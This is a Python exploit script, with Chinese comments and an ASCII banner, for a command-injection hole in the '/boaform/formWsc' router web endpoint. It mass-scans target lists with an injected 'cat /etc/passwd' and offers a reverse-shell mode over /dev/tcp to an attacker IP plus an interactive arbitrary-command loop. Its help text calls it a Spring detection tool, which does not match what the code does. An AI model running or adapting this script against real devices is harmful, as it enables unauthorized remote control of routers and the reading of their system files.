#!/usr/bin/python3
# -*- coding:utf-8 -*-
import requests
import argparse
import warnings
import urllib3
import textwrap
from multiprocessing.dummy import Pool

# 关闭警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

# 定义全局变量
PATH = '/boaform/formWsc'
THREADS = 30  # 调整线程数


def check(domain):
    data='''targetAPMac=001A2B3C4D5E&targetAPSsid=3232&submit-url=aaaaaa&localPin=aaaa%20||%20cat%20/etc/passwd'''
    url = domain + PATH
    headers = {
        'Content-Type':'application/x-www-form-urlencoded'
    }
    try:
        response = requests.post(url,data=data,headers=headers, timeout=3, verify=False)
        if response.status_code == 200 and 'root' in response.text:
            print(f'[+] {url} 存在漏洞')
        # else:
        #     print(f'[-] {url} 不存在漏洞')
    except requests.exceptions.RequestException as e:
        # 可以选择忽略连接错误或超时，或者打印调试信息
        # print(f'[!] {url} 请求失败: {str(e)}')
        pass
    except Exception as e:
        # 其他异常，打印调试信息
        # print(f'[!] {url} 发生错误: {str(e)}')
        pass

def exp(domain,sle):
    if sle=='r':
        ip = input("请输入攻击者的IP地址：")
        port = input("请输入攻击者的监听端口：")
        data = f'targetAPMac=001A2B3C4D5E&targetAPSsid=3232&submit-url=aaaaaa&localPin=aaaa%20||%20sh%20-i%20>&%20/dev/tcp/{ip}/{port}%200>&1'
        url = domain + PATH
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        try:
            requests.post(url, data=data, headers=headers, timeout=3, verify=False)
            # else:
            #     print(f'[-] {url} 不存在漏洞')
        except requests.exceptions.RequestException as e:
            # 可以选择忽略连接错误或超时，或者打印调试信息
            # print(f'[!] {url} 请求失败: {str(e)}')
            pass
        except Exception as e:
            # 其他异常，打印调试信息
            # print(f'[!] {url} 发生错误: {str(e)}')
            pass
    elif sle=='z':
        cmd=1
        print("结束请按回车")
        while cmd:
            cmd = input(">>")
            data = f'targetAPMac=001A2B3C4D5E&targetAPSsid=3232&submit-url=aaaaaa&localPin=aaaa%20||%20{cmd}'
            url = domain + PATH
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            response = requests.post(url, data=data, headers=headers, timeout=3, verify=False)
            print(response.text, response.status_code)


def main():
    # 实例化一个对象 , 并添加命令行的描述信息,一般在脚本中用来介绍脚本是干嘛的
    parser = argparse.ArgumentParser(description='spring未授权检测工具',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''示例：python one.py -u http://www.baidu.com'''))

    # dest给输入值取参数名
    parser.add_argument("-u", dest="url", help="输入链接执行EXP")
    parser.add_argument("-f", dest="file", help="输入文件批量检测是否存在漏洞")
    # parse_args将输入的值解析为python对象
    args = parser.parse_args()
    if args.url:
        if 'http' not in args.url:
            args.url=f'http://{args.url}'
        sel=input('反弹shell输入r，命令执行输入z:')
        exp(args.url,sel)
    elif args.file:
        urls = []
        with open(args.file, 'r') as f:
            for line in f:
                domain = line.strip()
                if not domain:
                    continue
                if domain.startswith('http://'):
                    urls.append(domain)
                else:
                    urls.append(f'http://{domain}')

        print(f'开始扫描，共 {len(urls)} 个URL')
        pool = Pool(THREADS)
        pool.map(check, urls)
        pool.close()
        pool.join()
        print('扫描完成')


if __name__ == '__main__':
    banner = """ 
    .___                .___                   .__                        
  __| _/____  ___.__. __| _/____  ___.__. _____|  |   ____   ____ ______  
 / __ |\__  \<   |  |/ __ |\__  \<   |  |/  ___/  | _/ __ \_/ __ \\____ \ 
/ /_/ | / __ \\___  / /_/ | / __ \\___  |\___ \|  |_\  ___/\  ___/|  |_> >
\____ |(____  / ____\____ |(____  / ____/____  >____/\___  >\___  >   __/ 
     \/     \/\/         \/     \/\/         \/          \/     \/|__|    

    """
    print(banner)
    #函数调用
    main()